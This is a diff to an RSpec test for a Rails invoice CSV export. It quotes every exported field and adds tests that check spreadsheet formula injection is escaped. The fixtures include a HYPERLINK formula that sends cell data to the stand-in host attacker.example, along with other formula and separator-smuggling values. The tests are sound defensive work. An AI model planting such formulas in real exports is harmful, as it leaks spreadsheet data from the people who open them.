@@ -4,45 +4,6 @@ require "rails_helper"
 
 RSpec.describe DataExports::Csv::Invoices, :premium do
   let(:data_export) { create :data_export, :processing, resource_query:, organization: }
-
-  let(:data_export_part) { data_export.data_export_parts.create(object_ids: [invoice.id], index: 1, organization:) }
-
-  let(:resource_query) do
-    {
-      currency:,
-      customer_external_id:,
-      customer_id:,
-      invoice_type:,
-      issuing_date_from:,
-      issuing_date_to:,
-      payment_dispute_lost:,
-      payment_overdue:,
-      payment_status:,
-      search_term:,
-      self_billed:,
-      status:
-    }
-  end
-
-  let(:currency) { "EUR" }
-  let(:customer_id) { "customer-lago-id-123" }
-  let(:customer_external_id) { "custext123" }
-  let(:invoice_type) { "credit" }
-  let(:issuing_date_from) { "2023-12-25" }
-  let(:issuing_date_to) { "2024-07-01" }
-  let(:payment_dispute_lost) { false }
-  let(:payment_overdue) { true }
-  let(:payment_status) { "pending" }
-  let(:search_term) { "service ABC" }
-  let(:self_billed) { false }
-  let(:status) { "finalized" }
-
-  let(:serializer_klass) { class_double("V1::InvoiceSerializer") }
-  let(:invoice_serializer) do
-    instance_double("V1::InvoiceSerializer", serialize: serialized_invoice)
-  end
-  let(:organization) { create(:organization, premium_integrations: ["progressive_billing"]) }
-  let(:invoice) { create :invoice, organization: }
   let(:serialized_invoice) do
     {
       lago_id: "invoice-lago-id-123",
@@ -81,6 +42,51 @@ RSpec.describe DataExports::Csv::Invoices, :premium do
     }
   end
 
+  let(:data_export_part) { data_export.data_export_parts.create(object_ids: [invoice.id], index: 1, organization:) }
+
+  let(:resource_query) do
+    {
+      currency:,
+      customer_external_id:,
+      customer_id:,
+      invoice_type:,
+      issuing_date_from:,
+      issuing_date_to:,
+      payment_dispute_lost:,
+      payment_overdue:,
+      payment_status:,
+      search_term:,
+      self_billed:,
+      status:
+    }
+  end
+
+  let(:currency) { "EUR" }
+  let(:customer_id) { "customer-lago-id-123" }
+  let(:customer_external_id) { "custext123" }
+  let(:invoice_type) { "credit" }
+  let(:issuing_date_from) { "2023-12-25" }
+  let(:issuing_date_to) { "2024-07-01" }
+  let(:payment_dispute_lost) { false }
+  let(:payment_overdue) { true }
+  let(:payment_status) { "pending" }
+  let(:search_term) { "service ABC" }
+  let(:self_billed) { false }
+  let(:status) { "finalized" }
+
+  let(:serializer_klass) { class_double("V1::InvoiceSerializer") }
+  let(:invoice_serializer) do
+    instance_double("V1::InvoiceSerializer", serialize: serialized_invoice)
+  end
+
+  let_it_be(:organization) { create_default(:organization, premium_integrations: ["progressive_billing"]) }
+
+  before_all do
+    create_default(:customer)
+  end
+
+  let_it_be(:invoice) { create :invoice, organization: }
+
   before do
     invoice
     create(:credit_note, offset_amount_cents: 334, invoice:)
@@ -97,7 +103,7 @@ RSpec.describe DataExports::Csv::Invoices, :premium do
 
     it "generates the correct CSV output" do
       expected_csv = <<~CSV
-        invoice-lago-id-123,SEQ123,false,2023-01-01,customer-lago-id-456,CUST123,customer name,customer@eamil.com,US,123456789,INV123,PO-12345,credit,pending,finalized,http://api.lago.com/invoice.pdf,USD,70000,1655,10500,334,1000,77511,2023-02-01,2023-12-22,false,27511,50000,334,999
+        "invoice-lago-id-123","SEQ123","false","2023-01-01","customer-lago-id-456","CUST123","customer name","customer@eamil.com","US","123456789","INV123","PO-12345","credit","pending","finalized","http://api.lago.com/invoice.pdf","USD","70000","1655","10500","334","1000","77511","2023-02-01","2023-12-22","false","27511","50000","334","999"
       CSV
 
       expect(result).to be_success
@@ -109,6 +115,63 @@ RSpec.describe DataExports::Csv::Invoices, :premium do
       expect(generated_csv).to eq(expected_csv)
     end
 
+    context "when values would be read as spreadsheet formulas" do
+      let(:serialized_invoice) do
+        super().deep_merge(
+          customer: {
+            name: "=HYPERLINK(\"https://attacker.example/?c\"&A1,\"Open invoice\")",
+            email: "\t=1+1",
+            tax_identification_number: "-1+SUM(A1)"
+          },
+          purchase_order_number: "-1.5",
+          total_due_amount_cents: -150
+        )
+      end
+
+      it "escapes them and keeps numbers" do
+        file = result.csv_file
+        row = CSV.parse_line(file.read)
+        file.close
+        File.unlink(file.path)
+
+        expect(row[6]).to eq("'=HYPERLINK(\"https://attacker.example/?c\"&A1,\"Open invoice\")")
+        expect(row[7]).to eq("'\t=1+1")
+        expect(row[9]).to eq("'-1+SUM(A1)")
+        expect(row[11]).to eq("-1.5")
+        expect(row[26]).to eq("-150")
+      end
+    end
+
+    context "when values contain separators and quotes" do
+      let(:serialized_invoice) do
+        super().deep_merge(
+          customer: {
+            name: "safe;=1+1;safe",
+            email: "a\",\"=1+1",
+            tax_identification_number: "x\t=1+1|@SUM(1)"
+          }
+        )
+      end
+
+      it "keeps every value in a single quoted field" do
+        file = result.csv_file
+        line = file.read
+        file.close
+        File.unlink(file.path)
+
+        # Every value is quoted (nil stays an empty unquoted field), so a spreadsheet splitting on ";"
+        # or another separator cannot cut a value
+        expect(line).to match(/\A(?:"(?:[^"]|"")*")?(?:,(?:"(?:[^"]|"")*")?)*\n\z/)
+        expect(line).to include(%("safe;=1+1;safe"))
+        expect(line).to include(%("a"",""=1+1"))
+
+        row = CSV.parse_line(line)
+        expect(row[6]).to eq("safe;=1+1;safe")
+        expect(row[7]).to eq("a\",\"=1+1")
+        expect(row[9]).to eq("x\t=1+1|@SUM(1)")
+      end
+    end
+
     context "when organization has multiple billing_entities" do
       let(:billing_entity) { create(:billing_entity, organization:) }
 
@@ -116,7 +179,7 @@ RSpec.describe DataExports::Csv::Invoices, :premium do
 
       it "adds billing_entity_code to the csv" do
         expected_csv = <<~CSV
-          invoice-lago-id-123,SEQ123,false,2023-01-01,customer-lago-id-456,CUST123,customer name,customer@eamil.com,US,123456789,INV123,PO-12345,credit,pending,finalized,http://api.lago.com/invoice.pdf,USD,70000,1655,10500,334,1000,77511,2023-02-01,2023-12-22,false,27511,50000,334,999,the-test-bil-ent
+          "invoice-lago-id-123","SEQ123","false","2023-01-01","customer-lago-id-456","CUST123","customer name","customer@eamil.com","US","123456789","INV123","PO-12345","credit","pending","finalized","http://api.lago.com/invoice.pdf","USD","70000","1655","10500","334","1000","77511","2023-02-01","2023-12-22","false","27511","50000","334","999","the-test-bil-ent"
         CSV
 
         expect(result).to be_success
